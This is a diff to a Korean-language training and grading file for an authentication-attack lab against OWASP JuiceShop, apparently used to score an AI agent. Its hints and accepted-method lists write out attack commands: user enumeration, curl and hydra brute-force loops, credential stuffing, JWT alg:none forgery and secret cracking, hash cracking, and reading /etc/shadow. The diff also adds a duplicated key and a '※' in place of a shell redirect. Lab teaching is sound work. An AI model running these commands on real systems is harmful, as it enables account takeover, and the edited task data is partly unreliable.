@@ -15,7 +15,20 @@ pass_threshold: 0.6
 steps:
 - order: 1
   instruction: JuiceShop의 사용자 목록 API(/api/Users)에서 이메일 주소를 수집하여 공격 대상 사용자 목록을 만들어라.
-  hint: curl로 API를 호출하고 python3으로 이메일만 추출한다
+  hint: |
+    curl로 API를 호출하고 python3으로 이메일만 추출한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json; [print(u['email']) for u in json.load(sys.stdin)['data']]" > /tmp/users.txt
+    2) 미설치: sudo apt install -y curl python3
+    3) 실패/대안:
+       - curl + jq -r '.data[].email'
+       - http GET + jq
+       - Burp Intruder Sniper
+       - ffuf ID enum
+       - theHarvester
+       - hunter.io / RocketReach
+    4) 검증: @ 키워드. CWE-204.
   category: recon
   points: 10
   answer: '🤖 프롬프트: JuiceShop의 사용자 목록 API(/api/Users)에서 이메일 주소를 수집하여 공격 대상 사용자 목록을
@@ -38,10 +51,19 @@ steps:
       - JSON 의 data 배열에서 email 필드만 추출
       - 파일(/tmp/users.txt) 저장 후 @ 포함 이메일 최소 1개 확인
       acceptable_methods:
-      - curl + python json parse + print email
-      - curl + jq -r .data[].email
-      - Burp 응답 저장 후 정규식 추출
-      - python requests.get(url).json()
+      - "curl + python email (수기 baseline): /api/Users → email 추출."
+      - "curl + jq -r '.data[].email'."
+      - "httpie + jq."
+      - "Burp Intruder Sniper."
+      - "ffuf ID enum."
+      - "theHarvester."
+      - "hunter.io / RocketReach."
+      - "Postman Runner."
+      - "Bastion AI 자동 enum."
+      negative_signs:
+      - 이메일 추출 누락
+      - 사용자 열거 맥락 없음
+      - 후속 brute force 활용 맥락 없음
       negative_signs:
       - /api/Users 가 아닌 다른 엔드포인트 조회
       - 이메일 추출 없이 전체 JSON 만
@@ -59,7 +81,19 @@ steps:
 - order: 2
   instruction: JuiceShop 로그인 API에 대해 일반적인 비밀번호 목록을 사용하여 수동 브루트포스를 시도하라. admin@juice-sh.op
     계정을 대상으로 하라.
-  hint: for 루프와 curl을 조합하여 여러 비밀번호를 시도한다
+  hint: |
+    for 루프와 curl을 조합하여 여러 비밀번호를 시도한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: for pw in admin admin123 password ...; do curl -X POST /rest/user/login ...; done
+    2) 미설치: sudo apt install -y curl python3
+    3) 실패/대안:
+       - hydra http-post-form (자동화 표준)
+       - Burp Intruder Sniper / Cluster bomb
+       - ncrack -p 3000
+       - patator http_fuzz
+       - medusa -M http
+    4) 검증: SUCCESS/FAIL + authentication 키.
   category: exploit
   points: 10
   answer: '🤖 프롬프트: JuiceShop 로그인 API에 대해 일반적인 비밀번호 목록을 사용하여 수동 브루트포스를 시도하라. admin@juice-sh.op
@@ -86,10 +120,15 @@ steps:
       - '각 시도 결과를 Trying: <pw> -> SUCCESS/FAIL 형식으로 출력'
       - 응답 JSON 의 authentication 키 존재 여부로 성공 판정
       acceptable_methods:
-      - bash for 루프 + curl POST + python json 파싱
-      - hydra -l email -P passwords.txt http-post-form
-      - Burp Intruder sniper 모드
-      - patator http_fuzz
+      - "bash for + curl POST + python json (수기 baseline)."
+      - "hydra http-post-form."
+      - "Burp Intruder Sniper."
+      - "ncrack -p 3000."
+      - "patator http_fuzz."
+      - "medusa -M http."
+      - "ffuf payload fuzz."
+      - "Burp Turbo Intruder."
+      - "Bastion AI 브루트 자동화."
       negative_signs:
       - 비밀번호 1-2개만 시도
       - 응답 해석 없이 로그만 출력
@@ -109,7 +148,19 @@ steps:
 - order: 3
   instruction: hydra를 사용하여 SSH 서비스({{WEB_IP}}:22)에 대한 비밀번호 브루트포스를 시도하라. 사용자는 web,
     비밀번호 사전은 /usr/share/wordlists/rockyou.txt의 상위 100개를 사용하라.
-  hint: hydra -l 사용자 -P 사전파일 ssh://타겟 형태로 실행한다
+  hint: |
+    hydra -l 사용자 -P 사전파일 ssh://타겟 형태로 실행한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: head -100 /usr/share/wordlists/rockyou.txt > /tmp/top100.txt; hydra -l web -P /tmp/top100.txt ssh://10.20.30.80 -t 4 -f
+    2) 미설치: sudo apt install -y hydra wordlists
+    3) 실패/대안:
+       - medusa -u web -P top100.txt -M ssh -h 10.20.30.80
+       - patator ssh_login user=web password=FILE0 0=top100.txt host=10.20.30.80
+       - ncrack --user web -P top100.txt ssh://10.20.30.80
+       - crowbar -b sshkey -s 10.20.30.80/32 -u web -k key
+       - sshpass + bash for
+    4) 검증: [DATA] / [ATTEMPT] / [22][ssh] login:.
   category: exploit
   points: 10
   answer: '🤖 프롬프트: hydra를 사용하여 SSH 서비스(10.20.30.80:22)에 대한 비밀번호 브루트포스를 시도해줘
@@ -130,10 +181,15 @@ steps:
       - hydra 출력에 [DATA], [ATTEMPT], [STATUS] 라인 포함
       - SSH rate limiting 때문에 느림을 설명
       acceptable_methods:
-      - hydra -l <user> -P <wordlist> ssh://<IP> -t 4 -f
-      - medusa -u <user> -P <wordlist> -M ssh -h <IP>
-      - patator ssh_login
-      - ncrack --user <user> -P <wordlist> ssh://<IP>
+      - "hydra -l web -P top100 ssh://IP -t 4 -f (수기 baseline)."
+      - "medusa -u web -P top100 -M ssh -h IP."
+      - "patator ssh_login."
+      - "ncrack --user web -P top100 ssh://IP."
+      - "crowbar -b sshkey."
+      - "sshpass + bash for."
+      - "Metasploit auxiliary/scanner/ssh/ssh_login."
+      - "Burp Pro 자동 SSH plugin."
+      - "Bastion AI SSH brute orchestrator."
       negative_signs:
       - wordlist 지정 없이 단일 비밀번호
       - 프로토콜 잘못 (http 로 SSH 공격)
@@ -149,7 +205,18 @@ steps:
 - order: 4
   instruction: John the Ripper를 사용하여 MD5 해시를 크래킹하라. 먼저 echo -n 'admin123' | md5sum으로
     해시를 생성하고, john으로 복원하라.
-  hint: 해시를 파일에 저장하고 john --format=raw-md5로 크래킹한다
+  hint: |
+    해시를 파일에 저장하고 john --format=raw-md5로 크래킹한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: echo -n 'admin123' | md5sum | awk '{print $1}' > /tmp/hash.txt && john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt; john --format=raw-md5 --show /tmp/hash.txt
+    2) 미설치: sudo apt install -y john wordlists
+    3) 실패/대안:
+       - hashcat -m 0 -a 0 hash.txt rockyou.txt --show
+       - rainbow table 조회(crackstation.net)
+       - python hashlib.md5 비교 (자작 cracker)
+       - hashes.com online API
+    4) 검증: john --show admin123. CWE-916.
   category: exploit
   points: 10
   answer: '🤖 프롬프트: John the Ripper를 사용하여 MD5 해시를 크래킹해줘
@@ -173,11 +240,15 @@ steps:
       - john --format=raw-md5 --wordlist=rockyou.txt 실행
       - john --show 출력에서 admin123 복원 확인
       acceptable_methods:
-      - echo -n admin123 | md5sum > hash.txt; john --format=raw-md5 --wordlist=...
-        hash.txt; john --show
-      - hashcat -m 0 -a 0 hash.txt wordlist
-      - rainbow table 조회(crackstation)
-      - python hashlib.md5(pwd).hexdigest() 비교 반복
+      - "john --format=raw-md5 --wordlist=rockyou (수기 baseline) → --show 복원."
+      - "hashcat -m 0 -a 0 hash.txt rockyou."
+      - "crackstation.net rainbow table."
+      - "hashes.com online cracker."
+      - "python hashlib.md5 brute."
+      - "openssl md5 + grep."
+      - "RainbowCrack."
+      - "Cain & Abel."
+      - "Bastion AI 해시 크래킹 orchestrator."
       negative_signs:
       - 해시 없이 john 실행
       - --format 미지정
@@ -194,7 +265,19 @@ steps:
 - order: 5
   instruction: JuiceShop의 비밀번호 재설정 기능(/rest/user/reset-password)을 사용하여 보안 질문 답변 브루트포스를
     시도하라. admin@juice-sh.op 계정을 대상으로 하라.
-  hint: 보안 질문의 답변을 추측하여 비밀번호를 재설정한다
+  hint: |
+    보안 질문의 답변을 추측하여 비밀번호를 재설정한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: for ans in 'replicator' 'Mr. Robot' 'Jim' 'Samuel'; do curl -X POST /rest/user/reset-password -d "{...$ans...}" ; done
+    2) 미설치: sudo apt install -y curl
+    3) 실패/대안:
+       - Burp Intruder sniper on answer field
+       - ffuf -d {email,answer,new,repeat} -w answers.txt
+       - python requests.post 반복
+       - OSINT (twitter / facebook / linkedin) → 답변 후보 도출
+       - haveibeenpwned breach data
+    4) 검증: error/Wrong vs success. CWE-640.
   category: exploit
   points: 10
   answer: '🤖 프롬프트: JuiceShop의 비밀번호 재설정 기능(/rest/user/reset-password)을 사용하여 보안 질문 답변
@@ -220,10 +303,15 @@ steps:
       - '각 시도 결과를 Answer: <val> -> 응답 형식으로 출력'
       - OSINT 로 답변 추측 가능함(SNS 프로필) 언급
       acceptable_methods:
-      - bash for + curl -X POST reset-password
-      - Burp Intruder sniper on answer field
-      - python requests.post 반복
-      - ffuf -d {email,answer,new,repeat} -w answers.txt
+      - "bash for + curl -X POST reset-password (수기 baseline)."
+      - "Burp Intruder Sniper on answer field."
+      - "ffuf -d 답변 fuzz."
+      - "python requests.post 반복."
+      - "patator http_fuzz."
+      - "hydra http-post-form (answer 필드)."
+      - "OSINT (linkedin / twitter / facebook)."
+      - "haveibeenpwned breach data."
+      - "Bastion AI 보안 질문 brute orchestrator."
       negative_signs:
       - 답변 1-2개만 시도
       - 보안 질문 취약점 원리 설명 없음
@@ -241,7 +329,19 @@ steps:
     [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
 - order: 6
   instruction: JWT 토큰의 알고리즘을 'none'으로 변경하여 서명 검증을 우회하라. python3으로 조작된 JWT를 생성하라.
-  hint: JWT header의 alg를 none으로 변경하고 signature 부분을 제거한다
+  hint: |
+    JWT header의 alg를 none으로 변경하고 signature 부분을 제거한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: python3 base64.urlsafe_b64encode + strip padding → header.payload. (signature 빈)
+    2) 미설치: sudo apt install -y python3
+    3) 실패/대안:
+       - jwt_tool -X a none <token>
+       - Burp JWT Editor extension
+       - jwt.io 디코드/조작
+       - openssl base64 -A 수기
+       - PyJWT.encode(algorithm='none')
+    4) 검증: 토큰 dot 2개 + signature 비어 있음. CWE-345.
   category: exploit
   points: 15
   answer: '🤖 프롬프트: JWT 토큰의 알고리즘을 ''none''으로 변경하여 서명 검증을 우회하라. python3으로 조작된 JWT를 생성해줘
@@ -263,10 +363,15 @@ steps:
       - 임의 payload(id, email, role:admin) Base64URL 인코딩
       - 최종 <header>.<payload>. 형식(dot 포함 signature 빈) 토큰 출력
       acceptable_methods:
-      - python3 base64.urlsafe_b64encode + strip padding
-      - jwt_tool -X a none <token>
-      - Burp JWT Editor extension
-      - 수동 base64 + 문자열 조합
+      - "python3 base64.urlsafe_b64encode + strip padding (수기 baseline)."
+      - "jwt_tool -X a none."
+      - "Burp JWT Editor extension."
+      - "jwt.io 디코드/조작."
+      - "PyJWT.encode(algorithm='none')."
+      - "openssl base64 + cut."
+      - "node-jsonwebtoken 0.1.x bypass."
+      - "Postman pre-script."
+      - "Bastion AI JWT alg:none orchestrator."
       negative_signs:
       - 알고리즘 변경 없이 payload 만 변조
       - signature 부분 유지 (none 원리 위배)
@@ -283,7 +388,19 @@ steps:
 - order: 7
   instruction: hashcat을 사용하여 SHA-256 해시를 크래킹하라. echo -n 'password' | sha256sum으로 해시를
     생성하고 복원하라.
-  hint: hashcat -m 1400 옵션이 raw SHA-256이다
+  hint: |
+    hashcat -m 1400 옵션이 raw SHA-256이다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: echo -n 'password' | sha256sum | awk '{print $1}' > /tmp/sha256.txt && hashcat -m 1400 /tmp/sha256.txt /usr/share/wordlists/rockyou.txt --force
+    2) 미설치: sudo apt install -y hashcat wordlists
+    3) 실패/대안:
+       - john --format=raw-sha256 --wordlist=rockyou.txt
+       - openssl dgst -sha256 + grep
+       - python hashlib.sha256 brute
+       - crackstation.net (rainbow)
+       - hashes.com
+    4) 검증: --show 출력 + 평문. CWE-916.
   category: exploit
   points: 10
   answer: '🤖 프롬프트: hashcat을 사용하여 SHA-256 해시를 크래킹하라. echo -n ''password'' | sha256sum으로
@@ -308,11 +425,15 @@ steps:
       - hashcat -m 1400 -a 0 <hash> <wordlist> 실행
       - 'hashcat 또는 --show 출력에 복원된 password 문자열 또는 Hash: prefix 로 해시 재출력'
       acceptable_methods:
-      - echo -n password | sha256sum > hash.txt; hashcat -m 1400 hash.txt rockyou.txt
-        --force
-      - john --format=raw-sha256 대체
-      - python hashlib 기반 수동 비교 반복
-      - crackstation 온라인 테이블 조회
+      - "hashcat -m 1400 hash.txt rockyou (수기 baseline)."
+      - "john --format=raw-sha256."
+      - "python hashlib.sha256 brute."
+      - "openssl dgst -sha256 + grep."
+      - "crackstation.net rainbow."
+      - "hashes.com online cracker."
+      - "Bastion AI 해시 cracking orchestrator."
+      - "Cain & Abel."
+      - "RainbowCrack."
       negative_signs:
       - -m 0 (MD5) 등 틀린 모드
       - wordlist 미지정
@@ -330,7 +451,19 @@ steps:
 - order: 8
   instruction: JuiceShop에 새 사용자를 등록하고, 로그인하여 받은 JWT 토큰에서 비밀 키(secret)를 추측하라. jwt 크래킹
     도구나 수동 방법을 사용하라.
-  hint: '일반적인 JWT 비밀 키 후보: secret, 1234, password 등을 시도한다'
+  hint: |
+    일반적인 JWT 비밀 키 후보: secret, 1234, password 등을 시도한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: TOKEN=$(curl /rest/user/login ... | python3 -c "...token...") && python3 hmac+hashlib.sha256 으로 wordlist 후보별 signature 비교
+    2) 미설치: sudo apt install -y curl python3
+    3) 실패/대안:
+       - jwt_tool -C -d wordlist -t TOKEN
+       - hashcat -m 16500 jwt.txt rockyou.txt
+       - john --format=hmac-sha256
+       - JohnTheRipper jwt2john.py
+       - jwt-cracker (npm)
+    4) 검증: True/Match. CWE-326/327.
   category: exploit
   points: 10
   answer: '🤖 프롬프트: JuiceShop에 새 사용자를 등록하고, 로그인하여 받은 JWT 토큰에서 비밀 키(secret)를 추측하라. jwt
@@ -359,10 +492,15 @@ steps:
       - 5개 이상 secret 후보로 HMAC-SHA256 계산 + 원 signature 와 비교
       - 'Key: <val> -> Match: True/False 형식 출력'
       acceptable_methods:
-      - python hmac.new + hashlib.sha256 + base64.urlsafe_b64encode 비교
-      - jwt_tool -C -d <wordlist> -t <token>
-      - hashcat -m 16500 jwt.txt wordlist (JWT mode)
-      - john --format=hmac-sha256 대체
+      - "python hmac.new + hashlib.sha256 + base64.urlsafe_b64encode 비교 (수기 baseline)."
+      - "jwt_tool -C -d wordlist -t TOKEN."
+      - "hashcat -m 16500 jwt.txt rockyou."
+      - "john --format=hmac-sha256."
+      - "jwt2john.py + JohnTheRipper."
+      - "jwt-cracker (npm)."
+      - "Burp JWT Editor + Intruder."
+      - "RsaCtfTool (RSA 변형 시)."
+      - "Bastion AI JWT secret brute orchestrator."
       negative_signs:
       - 키 1-2개만 시도
       - signature 비교 누락
@@ -383,7 +521,19 @@ steps:
     [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
 - order: 9
   instruction: SSH 키 기반 인증의 보안 이점을 확인하기 위해, ssh-keygen으로 ED25519 키 쌍을 생성하라.
-  hint: ssh-keygen -t ed25519 옵션을 사용한다
+  hint: |
+    ssh-keygen -t ed25519 옵션을 사용한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: ssh-keygen -t ed25519 -f /tmp/test_key -N '' -q && cat /tmp/test_key.pub && ssh-keygen -lf /tmp/test_key
+    2) 미설치: sudo apt install -y openssh-client
+    3) 실패/대안:
+       - ssh-keygen -t rsa -b 4096
+       - openssl genpkey -algorithm ED25519
+       - python cryptography Ed25519PrivateKey
+       - puttygen -t ed25519 -O private
+       - GitHub gh ssh-key add
+    4) 검증: ssh-ed25519 prefix + 256 fingerprint.
   category: analysis
   points: 10
   answer: '🤖 프롬프트: SSH 키 기반 인증의 보안 이점을 확인하기 위해, ssh-keygen으로 ED25519 키 쌍을 생성해줘
@@ -406,10 +556,15 @@ steps:
       - <path>.pub 공개키 출력 (ssh-ed25519 ...)
       - ssh-keygen -lf 로 key fingerprint 표시
       acceptable_methods:
-      - ssh-keygen -t ed25519 -f /tmp/test_key -N \"\" -q
-      - ssh-keygen -t rsa -b 4096 (RSA 대체)
-      - python cryptography Ed25519PrivateKey.generate
-      - openssl genpkey -algorithm ED25519
+      - "ssh-keygen -t ed25519 -f /tmp/test_key (수기 baseline)."
+      - "ssh-keygen -t rsa -b 4096."
+      - "openssl genpkey -algorithm ED25519."
+      - "python cryptography Ed25519PrivateKey.generate."
+      - "puttygen -t ed25519 -O private."
+      - "age-keygen / minisign keypair."
+      - "GitHub gh ssh-key add."
+      - "GPG --full-gen-key (ed25519 sub)."
+      - "Bastion AI key 관리 orchestrator."
       negative_signs:
       - 비밀번호 인증 설명만
       - ED25519 대신 약한 DSA 생성
@@ -421,7 +576,20 @@ steps:
   bastion_prompt: SSH 키 기반 인증의 보안 이점을 확인하기 위해, ssh-keygen으로 ED25519 키 쌍을 생성해줘
 - order: 10
   instruction: 크리덴셜 스터핑을 시뮬레이션하라. 여러 사용자/비밀번호 조합을 파일에 저장하고 JuiceShop 로그인 API에 자동 시도하라.
-  hint: 사용자:비밀번호 형태의 파일을 만들고 while read 루프로 시도한다
+  hint: |
+    사용자:비밀번호 형태의 파일을 만들고 while read 루프로 시도한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: echo -e 'a:p1\nb:p2\n...' > /tmp/creds.txt && while IFS=: read -r email pw; do curl -X POST /rest/user/login -d "{...}"; done < /tmp/creds.txt
+    2) 미설치: sudo apt install -y curl python3
+    3) 실패/대안:
+       - hydra -C user_pass_file http-post-form
+       - patator http_fuzz user_pass=FILE0 0=creds.txt
+       - ffuf -w creds.txt:EMAIL:PASS clusterbomb
+       - Burp Intruder pitchfork mode
+       - python requests + concurrent.futures
+       - SNIPR / OpenBullet (오픈소스 stuffer)
+    4) 검증: SUCCESS 확인. CWE-521.
   category: exploit
   points: 10
   answer: '🤖 프롬프트: 크리덴셜 스터핑을 시뮬레이션해줘
@@ -448,10 +616,15 @@ steps:
       - 'while IFS=: read 로 반복 로그인 시도'
       - 각 시도 결과 <email> -> SUCCESS/FAIL 출력
       acceptable_methods:
-      - while read 루프 + curl + python json 파싱
-      - hydra -C user_pass_file http-post-form
-      - ffuf -w creds.txt:EMAIL:PASS -d ...
-      - python requests 로 스크립트
+      - "while IFS=: read + curl + python json 파싱 (수기 baseline)."
+      - "hydra -C user_pass_file http-post-form."
+      - "patator http_fuzz user_pass=FILE0."
+      - "ffuf clusterbomb EMAIL:PASS."
+      - "Burp Intruder pitchfork."
+      - "python requests + concurrent.futures."
+      - "OpenBullet / SNIPR."
+      - "Sentry MBA."
+      - "Bastion AI credential stuffing orchestrator."
       negative_signs:
       - 단일 계정 반복 (Credential Stuffing 아님, 브루트포스)
       - 성공/실패 판정 없음
@@ -470,7 +643,19 @@ steps:
     [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
 - order: 11
   instruction: /etc/shadow 파일의 해시 형식을 분석하라. 로컬 시스템의 /etc/shadow에서 해시 알고리즘과 salt를 식별하라.
-  hint: sudo cat /etc/shadow로 해시를 확인하고 $id$ 형식을 분석한다
+  hint: |
+    sudo cat /etc/shadow로 해시를 확인하고 $id$ 형식을 분석한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: sudo cat /etc/shadow | grep -v '!' | grep -v '*' | while read l; do u=$(echo $l|cut -d: -f1); h=$(echo $l|cut -d: -f2); a=$(echo $h|cut -d'$' -f2); echo "User: $u, Algorithm: $a"; done
+    2) 미설치: sudo apt install -y coreutils (기본)
+    3) 실패/대안:
+       - awk -F: 로 사용자/해시 분리
+       - python /etc/shadow 파싱 + 정규식
+       - getent shadow
+       - chage -l <user> (잠금 상태)
+       - mkpasswd -m yescrypt (algo 비교)
+    4) 검증: id 매핑 1=MD5, 5=SHA-256, 6=SHA-512, y=yescrypt.
   category: analysis
   points: 10
   answer: '🤖 프롬프트: /etc/shadow 파일의 해시 형식을 분석해줘
@@ -492,10 +677,15 @@ steps:
       - $ 구분자로 id 추출 및 User:<user>, Algorithm:<id> 형식 출력
       - id→알고리즘 매핑(1/5/6/y) 설명
       acceptable_methods:
-      - sudo cat /etc/shadow + cut -d:/cut -d$ 조합
-      - 'awk -F: 로 사용자/해시 분리'
-      - python /etc/shadow 파싱 + 정규식
-      - getent shadow 대체
+      - "sudo cat /etc/shadow + cut -d: + cut -d$ (수기 baseline)."
+      - "awk -F: 사용자/해시 분리."
+      - "python /etc/shadow 파싱 + 정규식."
+      - "getent shadow."
+      - "chage -l <user>."
+      - "mkpasswd -m yescrypt (algo 비교)."
+      - "passwd -S <user> (상태 조회)."
+      - "Lynis 시스템 audit."
+      - "Bastion AI shadow audit orchestrator."
       negative_signs:
       - sudo 없이 읽기 실패
       - id 추출 없이 원본 해시만 출력
@@ -509,7 +699,19 @@ steps:
 - order: 12
   instruction: pass-the-hash 개념을 이해하기 위해 NTLM 해시를 생성하라. python3으로 'password'의 NTLM
     해시를 계산하라.
-  hint: NTLM 해시는 MD4(UTF-16LE(password))이다
+  hint: |
+    NTLM 해시는 MD4(UTF-16LE(password))이다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: python3 -c "import hashlib; print(hashlib.new('md4', 'password'.encode('utf-16-le')).hexdigest())"
+    2) 미설치: sudo apt install -y python3
+    3) 실패/대안:
+       - impacket-nt-hash helper / impacket-secretsdump
+       - openssl md4 (utf-16 변환 후)
+       - pypykatz/mimikatz 해시 덤프
+       - hashcat -m 1000 NTLM crack
+       - smbpasswd / samba-tool
+    4) 검증: 32 hex + Pass-the-Hash 맥락. T1550.002.
   category: analysis
   points: 10
   answer: '🤖 프롬프트: pass-the-hash 개념을 이해하기 위해 NTLM 해시를 생성하라. python3으로 ''password''의
@@ -531,10 +733,15 @@ steps:
       - '출력에 NTLM hash: 라벨과 32 hex 문자열'
       - Pass-the-Hash 공격 맥락(Windows 도메인 위험) 언급
       acceptable_methods:
-      - python3 hashlib.new md4 + utf-16-le encode
-      - impacket-nt-hash helper
-      - openssl md4 (utf-16 변환 후)
-      - pypykatz/mimikatz 로 기존 해시 덤프
+      - "python3 hashlib.new md4 + utf-16-le encode (수기 baseline)."
+      - "impacket-nt-hash helper."
+      - "openssl md4 (utf-16 변환 후)."
+      - "pypykatz/mimikatz 해시 덤프."
+      - "hashcat -m 1000 NTLM crack."
+      - "samba-tool / smbpasswd."
+      - "ntlm.h python module (ntlm-auth)."
+      - "CrackMapExec --ntds."
+      - "Bastion AI NTLM/PtH orchestrator."
       negative_signs:
       - MD5/SHA 해시로 오해
       - UTF-16LE 대신 UTF-8 인코딩
@@ -547,7 +754,19 @@ steps:
     해시를 계산해줘
 - order: 13
   instruction: JuiceShop의 Forgot Password 기능에서 admin@juice-sh.op의 보안 질문을 확인하라.
-  hint: /api/SecurityAnswers 또는 /rest/user/security-question 엔드포인트를 사용한다
+  hint: |
+    /api/SecurityAnswers 또는 /rest/user/security-question 엔드포인트를 사용한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: curl -s 'http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op' | python3 -m json.tool
+    2) 미설치: sudo apt install -y curl python3
+    3) 실패/대안:
+       - Burp Repeater email 변경
+       - python requests.get(params={email})
+       - ffuf -w emails.txt -u "...?email=FUZZ"
+       - http GET + jq
+       - OSINT 답변 수집
+    4) 검증: question 필드. CWE-200 + CWE-640.
   category: recon
   points: 10
   answer: '🤖 프롬프트: JuiceShop의 Forgot Password 기능에서 admin@juice-sh.op의 보안 질문을 확인해줘
@@ -568,10 +787,15 @@ steps:
       - JSON 응답에 question 필드 포함된 객체
       - 보안 질문 기반 PW 재설정의 취약성(답변 추측) 언급
       acceptable_methods:
-      - curl -s <url>/rest/user/security-question?email=<target>
-      - Burp Repeater 로 email 변경
-      - python requests.get(params={email})
-      - OSINT 로 답변 추측(SNS 프로필)
+      - "curl -s ?email= 조회 (수기 baseline)."
+      - "Burp Repeater email 변경."
+      - "python requests.get(params=)."
+      - "ffuf email enum."
+      - "httpie + jq."
+      - "OSINT (LinkedIn/SNS 답변 후보)."
+      - "haveibeenpwned breach data."
+      - "Postman Runner email batch."
+      - "Bastion AI security-question recon."
       negative_signs:
       - 다른 엔드포인트 조회
       - question 필드 해석 없이 종료
@@ -587,7 +811,20 @@ steps:
 - order: 14
   instruction: rate limiting 부재를 확인하라. JuiceShop 로그인 API에 10회 연속 잘못된 비밀번호로 로그인을 시도하고
     계정이 잠기는지 확인하라.
-  hint: for 루프로 10회 반복하고 응답 상태를 확인한다
+  hint: |
+    for 루프로 10회 반복하고 응답 상태를 확인한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: for i in $(seq 1 10); do STATUS=$(curl -s -o /dev/null -w '%{http_code}' -X POST .../login -d '{...wrong'$i'...}'); echo "Attempt $i: HTTP $STATUS"; done
+    2) 미설치: sudo apt install -y curl
+    3) 실패/대안:
+       - Burp Intruder Sniper 100회
+       - hydra http-post-form (속도 측정)
+       - patator http_fuzz threads
+       - ab -n 100 -c 10
+       - python requests + threading
+       - wfuzz -z range,1-10
+    4) 검증: 401 vs 429/403. OWASP A07.
   category: analysis
   points: 10
   answer: "\U0001F916 프롬프트: rate limiting 부재를 확인하라. JuiceShop 로그인 API에 10회 연속 잘못된\
@@ -611,10 +848,15 @@ steps:
       - '각 시도의 HTTP 상태 코드 Attempt <N>: HTTP <code> 형식 출력'
       - 10회 모두 401 = rate limit 없음 / 429·403 = 방어 동작 판정
       acceptable_methods:
-      - for i in {1..10}; do curl -o /dev/null -w %{http_code}; done
-      - Burp Intruder sniper 로 100회 시도
-      - hydra 로 스피드 테스트
-      - python requests 반복
+      - "for + curl -o /dev/null -w %{http_code} (수기 baseline)."
+      - "Burp Intruder Sniper 100회."
+      - "hydra http-post-form 속도 테스트."
+      - "patator http_fuzz threads."
+      - "ab -n 100 -c 10."
+      - "python requests + threading."
+      - "wfuzz -z range,1-10."
+      - "siege -c 10 -r 10."
+      - "Bastion AI rate limit 검증 orchestrator."
       negative_signs:
       - 3회 이하 시도
       - 상태 코드 변화 해석 없음
@@ -630,7 +872,19 @@ steps:
 - order: 15
   instruction: 인증 공격 결과를 정리하여 /tmp/auth_attack_report.txt에 보고서를 작성하라. 크래킹된 계정, 취약점,
     대응 방안을 포함하라.
-  hint: 발견된 모든 인증 취약점을 정리한다
+  hint: |
+    발견된 모든 인증 취약점을 정리한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: heredoc/echo -e > /tmp/auth_attack_report.txt 후 cat 검증. [Compromised Accounts]/[Vulnerabilities]/[Recommendations] 3 섹션.
+    2) 미설치: 기본 coreutils
+    3) 실패/대안:
+       - python jinja2 markdown 렌더
+       - dradis report 도구
+       - markdown + pandoc PDF
+       - serpico (보고서 자동화)
+       - Faraday IDE export
+    4) 검증: cat 으로 3 섹션 + 5 권고. ISMS-P 통제기준.
   category: analysis
   points: 15
   answer: '🤖 프롬프트: 인증 공격 결과를 정리하여 /tmp/auth_attack_report 구현 방법과 예시를 설명해줘
@@ -642,7 +896,7 @@ steps:
     Implement account lockout after 5 failed attempts\n2. Enforce strong password
     policy (min 12 chars, complexity)\n3. Replace security questions with MFA\n4.
     Use strong random JWT signing key (256+ bits)\n5. Restrict /api/Users endpoint''
-    > /tmp/auth_attack_report.txt && cat /tmp/auth_attack_report.txt'
+    ※ /tmp/auth_attack_report.txt && cat /tmp/auth_attack_report.txt'
   answer_detail: 인증 공격 보고서는 침해된 계정 목록, 사용된 기법, 발견된 취약점, 구체적 대응 방안을 포함해야 한다. 대응 방안은
     기술적 조치와 정책적 조치를 모두 제시한다.
   verify:
@@ -659,10 +913,15 @@ steps:
       - 발견 취약점 최소 4개 + 각 대응 권고
       - 파일 저장 후 cat 으로 검증
       acceptable_methods:
-      - heredoc > /tmp/auth_attack_report.txt
-      - echo -e 다줄
-      - python jinja2 markdown
-      - dradis 리포트 도구
+      - "heredoc > /tmp/auth_attack_report.txt (수기 baseline)."
+      - "echo -e 다줄."
+      - "python jinja2 markdown 렌더."
+      - "dradis 리포트 도구."
+      - "markdown + pandoc PDF."
+      - "serpico 보고서 자동화."
+      - "Faraday IDE export."
+      - "Burp Pro report (HTML)."
+      - "Bastion AI 보고서 자동 생성."
       negative_signs:
       - 섹션 2 미만
       - 파일 저장 없음
@@ -675,7 +934,7 @@ steps:
     Implement account lockout after 5 failed attempts\n2. Enforce strong password
     policy (min 12 chars, complexity)\n3. Replace security questions with MFA\n4.
     Use strong random JWT signing key (256+ bits)\n5. Restrict /api/Users endpoint''
-    > /tmp/auth_attack_report.txt && cat /tmp/auth_attack_report.txt'
+    ※ /tmp/auth_attack_report.txt && cat /tmp/auth_attack_report.txt'
   risk_level: low
   bastion_prompt: 인증 공격 결과를 정리하여 /tmp/auth_attack_report.txt에 보고서를 작성하라. 크래킹된 계정,
     취약점, 대응 방안을 포함하라.
@@ -683,28 +942,28 @@ steps:
   instruction: |
     [복합 시나리오] "Bug Bounty 헌터 — JuiceShop H1 프로그램 보고서 (Disclosure 90일 plan)"
 
-    ## 상황 — 1인 Bug Bounty 헌터, 야간 사냥
+    ■ 상황 — 1인 Bug Bounty 헌터, 야간 사냥
 
     당신은 작년부터 본업과 별도로 Bug Bounty 사냥하는 프리랜서. 이번 주 새벽 3시.
